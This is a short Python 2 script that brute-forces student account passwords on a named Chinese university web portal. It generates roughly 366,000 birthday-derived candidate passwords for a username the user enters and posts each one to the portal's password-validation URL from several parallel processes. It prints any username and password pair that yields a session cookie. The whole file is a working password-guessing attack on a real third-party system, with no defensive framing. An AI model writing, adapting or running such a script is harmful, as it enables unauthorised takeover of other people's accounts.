#coding=utf-8
import requests
from multiprocessing import Process
from multiprocessing import Pool
import datetime
import threading
passwords=[]
usernames=[]
result=''
def psw():
	birth=[]
	last_three=[]
	startdate=datetime.datetime(2000,1,1)
	for i in range(366):
		if str(startdate.strftime('%m%d'))[1:] not in birth:
			birth.append(str(startdate.strftime('%m%d'))[1:])
		startdate=startdate+datetime.timedelta(days=1)	
	for j in range(1000):
		last_three.append(('000'+str(j))[-3:])
	for i in birth:
		for j in last_three:
			passwords.append(i+j)
def usn():
	usernames.append(raw_input('Input the username please! >>>>>'))

def network(x,y,a,b):
	data={
		'userName':'',
		'password':'',
		's':'0.41154266567900777',
		'_':''
	}
	for i in a:
		for j in b[x*len(b)/y:(x+1)*len(b)/y+1]:
			data['userName']=i
			data['password']=j
			print data
			r=requests.post(url='http://yx2.ecust.edu.cn/thirdpartyUserPasswordValidate.portal',data=data)
			try: 	
				print r.cookies['JSESSIONID']
				print r.text
				cookie={'JSESSIONID':r.cookies['JSESSIONID']}
				r2=requests.get(url='http://yx2.ecust.edu.cn/index.portal',cookies=cookie)
				print '**************************un:'+i
				print '**************************pw:'+j
				result='****'+i+'*****'+j
				break
			except:
				pass
def proc():
	thread_num=int(raw_input('Input the number of treadings>>>>'))
	for m in range(thread_num):
		p=Process(target=network,args=(m,thread_num,usernames,passwords,))
		p.start()

if __name__=='__main__':
    usn()
    psw()

    proc()
